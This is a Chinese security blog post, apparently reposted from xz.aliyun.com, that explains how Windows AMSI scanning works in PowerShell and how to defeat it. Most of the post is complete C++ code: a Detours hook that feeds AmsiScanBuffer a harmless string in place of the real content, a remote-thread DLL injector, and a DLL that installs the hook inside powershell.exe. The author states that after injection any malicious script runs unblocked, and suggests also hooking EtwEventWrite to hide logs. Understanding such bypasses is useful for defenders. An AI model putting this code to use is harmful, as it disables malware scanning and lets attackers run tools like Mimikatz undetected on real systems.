> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/7973)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200702162414-69f6be28-bc3d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200702162414-69f6be28-bc3d-1.png)

TL;DR
-----

*   之前大概学过相关的技术但没认真研究和总结过，最近又研究学习了一下，这里做一下总结和分享。大家在渗透的时候都用过 powershell，powershell 的功能可谓非常之强大，常用于信息搜集、入侵、下载、提权、权限维持、横向移动等。常用的框架有 powersploit、Empire、Nishang 等，那 AMSI 又是啥？ AMSI(Anti-Malware Scan Interface)，即反恶意软件扫描接口，在 win10 和 server2016 上默认安装。如在使用 mimikatz 的 powershell 版时候会遇到如下的错误。  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20200702162441-79cae31a-bc3d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200702162441-79cae31a-bc3d-1.png)  
    产生这一错误的原因即为 AMSI 防护的效果。那么防护的原理是啥以及如果绕过呢？

### 初步想法

*   这个是网上已经公开了的绕过 AMSI 的技术，但理解并且掌握整个过程同样因缺斯听，它可以用来绕过一些安全机制比如说 ETW（Event Tracing for Windows）。这里要感谢 MDSec 以及 RdpTheif 工具的作者 oxo9AL，RdpTheif 工具使用了相似的技术。
*   AMSI 理论上是个很好的想法，在恶意脚本在执行的过程中去分析判断，然而这个理论在落地的时候存在缺陷，最终项目的代码可参考 [AmsiHook](https://github.com/tomcarver16/AmsiHook)  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20200710152035-d8d6093e-c27d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200710152035-d8d6093e-c27d-1.png)
*   可以看到尽管 "Invoke-Mimikatz" 这个字符串没有恶意执行的上下文可依然被检测并拦截，它是怎么工作的呢，微软在某些进程中加载了 amsi.dll，并导出了一些函数功能供杀软和 EDR 去使用，当然这其中主要是微软自家的 Windows Defender。  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20200702162809-f62aaf9e-bc3d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200702162809-f62aaf9e-bc3d-1.png)
*   如上所示，可以看到在启动 powershell 进程的时候加载了 amsi.dll.
*   查看 amsi.dll 中的导出函数，可以看到一个这样函数 AmsiScanBuffer，在 msdn 上查找这个函数.
    
    ```
    HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result
    );
    ```
    
*   传递给 AmsiScanBuffer 函数的最后一个参数是一个枚举类型指针名字为 result，这个 result 将决定执行这个脚本是否是恶意。
    

```
typedef enum AMSI_RESULT {
  AMSI_RESULT_CLEAN,
  AMSI_RESULT_NOT_DETECTED,
  AMSI_RESULT_BLOCKED_BY_ADMIN_START,
  AMSI_RESULT_BLOCKED_BY_ADMIN_END,
  AMSI_RESULT_DETECTED
};
```

*   理论上如果能控制这个 result（比如让它固定返回为 AMSI_RESULT_CLEAN），AMSI 就可能被绕过，所以该如何做呢？虽然 amsi.dll 注入到了进程，但是并没有内核驱动去保障 amsi.dll 是否被篡改，基于此让我们找个绕过的方法。

### HOOK 函数

*   HOOK 函数可以让我们在调用这个函数之前控制这个函数，作为攻击者我们能做的事情很多，比如记录参数日志、允许或者拦截函数的执行、覆盖传入这个函数的参数、修改函数的返回值，我们现在需要找到 hook AmsiScanBuffer 函数的方法，这里可使用微软提供的 hook 函数库 detours。
*   在这之前，你需要先编译 detours 成静态链接库，可以[参考文章](https://blog.csdn.net/qing666888/article/details/81540683), 注意这里编译成 X64 版本的。因为后面注入的 powershell 也是 64 位的进程，所以 amsihook.dll 就需要是 64 位，那么这个静态链接库我们也需要编译成 64 位。

```
#include <iostream>
#include <Windows.h>
#include <detours.h>

static int(WINAPI* OriginalMessageBox)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) = MessageBox;

int WINAPI _MessageBox(HWND hWnd, LPCSTR lpText, LPCTSTR lpCaption, UINT uType) {
    return OriginalMessageBox(NULL, L"We've used detours to hook MessageBox", L"Hooked Window", 0);
}

int main() {
    std::cout << "[+] Hooking MessageBox" << std::endl;

    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)OriginalMessageBox, _MessageBox);
    DetourTransactionCommit();

    std::cout << "[+] Message Box Hooked" << std::endl;

    MessageBox(NULL, L"My Message", L"My Caption", 0);

    std::cout << "[+] Unhooking MessageBox" << std::endl;

    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)OriginalMessageBox, _MessageBox);
    DetourTransactionCommit();

    std::cout << "[+] Message Box Unhooked" << std::endl;
}
```

*   上面代码通过 detours 库 hook 了 MessageBox 函数并重写了用户参数，以上我们可以用来 hook AmsiScanBuffer，现在创建一个项目，这个项目使用 AmsiScanBuffer 来检测字符串是否为恶意。

```
#include <iostream>
#include <Windows.h>
#include <amsi.h>
#include <system_error>
#pragma comment(lib, "amsi.lib")

////使用EICAR标准进行测试 https://en.wikipedia.org/wiki/EICAR_test_file
#define EICAR "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

const char* GetResultDescription(HRESULT hRes) {
    const char* description;
    switch (hRes)
    {
    case AMSI_RESULT_CLEAN:
        description = "AMSI_RESULT_CLEAN";
        break;
    case AMSI_RESULT_NOT_DETECTED:
        description = "AMSI_RESULT_NOT_DETECTED";
        break;
    case AMSI_RESULT_BLOCKED_BY_ADMIN_START:
        description = "AMSI_RESULT_BLOCKED_BY_ADMIN_START";
        break;
    case AMSI_RESULT_BLOCKED_BY_ADMIN_END:
        description = "AMSI_RESULT_BLOCKED_BY_ADMIN_END";
        break;
    case AMSI_RESULT_DETECTED:
        description = "AMSI_RESULT_DETECTED";
        break;
    default:
        description = "";
        break;
    }
    return description; 
}

int main() {
    HAMSICONTEXT amsiContext;
    HRESULT hResult = S_OK;
    AMSI_RESULT res = AMSI_RESULT_CLEAN;
    HAMSISESSION hSession = nullptr;

    LPCWSTR fname = L"EICAR";
    BYTE* sample = (BYTE*)EICAR;
    ULONG size = strlen(EICAR);

    ZeroMemory(&amsiContext, sizeof(amsiContext));

    hResult = AmsiInitialize(L"AmsiHook", &amsiContext);
    if (hResult != S_OK) {
        std::cout << std::system_category().message(hResult) << std::endl;
        std::cout << "[-] AmsiInitialize Failed" << std::endl;
        return hResult;
    }

    hResult = AmsiOpenSession(amsiContext, &hSession);
    if (hResult != S_OK) {
        std::cout << std::system_category().message(hResult) << std::endl;
        std::cout << "[-] AmsiOpenSession Failed" << std::endl;
        return hResult;
    }

    hResult = AmsiScanBuffer(amsiContext, sample, size, fname, hSession, &res);
    if (hResult != S_OK) {
        std::cout << std::system_category().message(hResult) << std::endl;
        std::cout << "[-] AmsiScanBuffer Failed " << std::endl;
        return hResult;
    }

    // Anything above 32767 is considered malicious
    std::cout << GetResultDescription(res) << std::endl;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200702162833-04226600-bc3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200702162833-04226600-bc3e-1.png)

*   以上代码部分参考 [https://github.com/atxsinn3r/amsiscanner/blob/master/amsiscanner.cpp](https://github.com/atxsinn3r/amsiscanner/blob/master/amsiscanner.cpp)
*   有了测试 AmsiScanBuffer 的基础代码，我们使用刚才在 hook messagebox 中使用的方法来 hook AmsiScanBuffer

```
#include <iostream>
#include <Windows.h>
#include <amsi.h>
#include <detours.h>
#include <system_error>
#pragma comment(lib, "amsi.lib")

#define EICAR "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
#define SAFE "SafeString"

//Converts number given out by AmsiScanBuffer into a readable string
const char* GetResultDescription(HRESULT hRes) {
    const char* description;
    switch (hRes)
    {
    case AMSI_RESULT_CLEAN:
        description = "AMSI_RESULT_CLEAN";
        break;
    case AMSI_RESULT_NOT_DETECTED:
        description = "AMSI_RESULT_NOT_DETECTED";
        break;
    case AMSI_RESULT_BLOCKED_BY_ADMIN_START:
        description = "AMSI_RESULT_BLOCKED_BY_ADMIN_START";
        break;
    case AMSI_RESULT_BLOCKED_BY_ADMIN_END:
        description = "AMSI_RESULT_BLOCKED_BY_ADMIN_END";
        break;
    case AMSI_RESULT_DETECTED:
        description = "AMSI_RESULT_DETECTED";
        break;
    default:
        description = "";
        break;
    }
    return description; 
}

//Store orignal version of AmsiScanBuffer
static HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext, 
                                                PVOID buffer, ULONG length, 
                                                LPCWSTR contentName, 
                                                HAMSISESSION amsiSession, 
                                                AMSI_RESULT* result) = AmsiScanBuffer;

//Our user controlled AmsiScanBuffer
HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) {
    return OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);
}

//Sets up detours to hook our function
void HookAmsi() {
    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
    DetourTransactionCommit();
}

//Undoes the hooking we setup earlier
void UnhookAmsi() {
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
    DetourTransactionCommit();
}

int main() {
    //Declares variables required for AmsiInitialize, AmsiOpenSession, and AmsiScanBuffer
    HAMSICONTEXT amsiContext;
    HRESULT hResult = S_OK;
    AMSI_RESULT res = AMSI_RESULT_CLEAN;
    HAMSISESSION hSession = nullptr;

    //Declare test case to use
    LPCWSTR fname = L"EICAR";
    BYTE* sample = (BYTE*)EICAR;
    ULONG size = strlen(EICAR);

    std::cout << "[+] Hooking AmsiScanBuffer" << std::endl;
    HookAmsi();
    std::cout << "[+] AmsiScanBuffer Hooked" << std::endl;

    ZeroMemory(&amsiContext, sizeof(amsiContext));

    hResult = AmsiInitialize(L"AmsiHook", &amsiContext);
    if (hResult != S_OK) {
        std::cout << std::system_category().message(hResult) << std::endl;
        std::cout << "[-] AmsiInitialize Failed" << std::endl;
        return hResult;
    }

    hResult = AmsiOpenSession(amsiContext, &hSession);
    if (hResult != S_OK) {
        std::cout << std::system_category().message(hResult) << std::endl;
        std::cout << "[-] AmsiOpenSession Failed" << std::endl;
        return hResult;
    }

    hResult = AmsiScanBuffer(amsiContext, sample, size, fname, hSession, &res);
    if (hResult != S_OK) {
        std::cout << std::system_category().message(hResult) << std::endl;
        std::cout << "[-] AmsiScanBuffer Failed " << std::endl;
        return hResult;
    }

    std::cout << GetResultDescription(res) << std::endl;

    std::cout << "[+] Unhooking AmsiScanBuffer" << std::endl;
    UnhookAmsi();
    std::cout << "[+] AmsiScanBuffer Unhooked" << std::endl;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200702162911-1b18bcba-bc3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200702162911-1b18bcba-bc3e-1.png)

*   可以看到我们绕过了 amsi 的内容检测，现在来思考如何关闭 AMSI 对恶意 powershell 脚本的拦截，这里可使用进程注入方式将 amsibypass.dll 注入到 powershell 进程（同样 amsi.dll 也注入进去了），让其 hook 掉 amsi.dll 的 AmsiScanBuffer 函数，让其返回 safe 的信息即可。

### dll 注入

*   dll 是一种类似 PE 的文件格式，然而它不可独立执行，它需要一个 pe 文件在运行的时候去加载，所以我们需要创建一个基础的注射器将 dll 加载并注入到 powershell 进程中。
*   注射器实现可以有多种方式，可以参考如下代码，也可以使用 [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings)

```
#include <iostream>
#include <windows.h>
#include <TlHelp32.h>

//Opens a handle to process then write to process with LoadLibraryA and execute thread
BOOL InjectDll(DWORD procID, char* dllName) {
    char fullDllName[MAX_PATH];
    LPVOID loadLibrary;
    LPVOID remoteString;

    if (procID == 0) {
        return FALSE;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (hProc == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    GetFullPathNameA(dllName, MAX_PATH, fullDllName, NULL);
    std::cout << "[+] Aquired full DLL path: " << fullDllName << std::endl;

    loadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    remoteString = VirtualAllocEx(hProc, NULL, strlen(fullDllName), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProc, remoteString, fullDllName, strlen(fullDllName), NULL);
    CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibrary, (LPVOID)remoteString, NULL, NULL);

    CloseHandle(hProc);
    return TRUE;
}

//Iterate all process until the name we're searching for matches
//Then return the process ID
DWORD GetProcIDByName(const char* procName) {
    HANDLE hSnap;
    BOOL done;
    PROCESSENTRY32 procEntry;

    ZeroMemory(&procEntry, sizeof(PROCESSENTRY32));
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    done = Process32First(hSnap, &procEntry);
    do {
        if (_strnicmp(procEntry.szExeFile, procName, sizeof(procEntry.szExeFile)) == 0) {
            return procEntry.th32ProcessID;
        }
    } while (Process32Next(hSnap, &procEntry));

    return 0;
}

int main(int argc, char** argv)
{
    const char* processName = argv[1];
    char* dllName = argv[2];
    DWORD procID = GetProcIDByName(processName);
    std::cout << "[+] Got process ID for " << processName << " PID: " << procID << std::endl;
    if (InjectDll(procID, dllName)) {
        std::cout << "DLL now injected!" << std::endl;
    } else {
        std::cout << "DLL couldn't be injected" << std::endl;
    }
}
```

*   现在来创建一个 dll 以及导出函数 AmsiScanBuffer

```
#include <Windows.h>
#include <detours.h>
#include <amsi.h>
#include <iostream>
#pragma comment(lib, "amsi.lib")

#define SAFE "SafeString"

static HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) = AmsiScanBuffer;

//Our user controlled AmsiScanBuffer
__declspec(dllexport) HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) {

    std::cout << "[+] AmsiScanBuffer called" << std::endl;
    std::cout << "[+] Buffer " << buffer << std::endl;
    std::cout << "[+] Buffer Length " << length << std::endl;
    return OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  dwReason,
    LPVOID lpReserved
)
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    if (dwReason == DLL_PROCESS_ATTACH) {
        AllocConsole();
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);

        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());

        DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();

    } else if (dwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();
        FreeConsole();
    }
    return TRUE;
}
```

*   将 AmsiHOOK.dll 注入到 powershell 进程中。  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20200702162943-2dc4ce3a-bc3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200702162943-2dc4ce3a-bc3e-1.png)
*   现在我们可以输入任何恶意脚本给 powershell 执行了且不会被拦截，这个项目只是一个基础，你可以做相当多的扩展，如 hook EtwEventWrite 函数去隐藏日志记录等等。
*   下一篇给大家分享另外一种更简单的绕过姿势。

Reference
---------

[Understanding and Bypassing AMSI](https://x64sec.sh/understanding-and-bypassing-amsi/)  
[初探 Powershell 与 AMSI 检测对抗技术](https://www.anquanke.com/post/id/168210)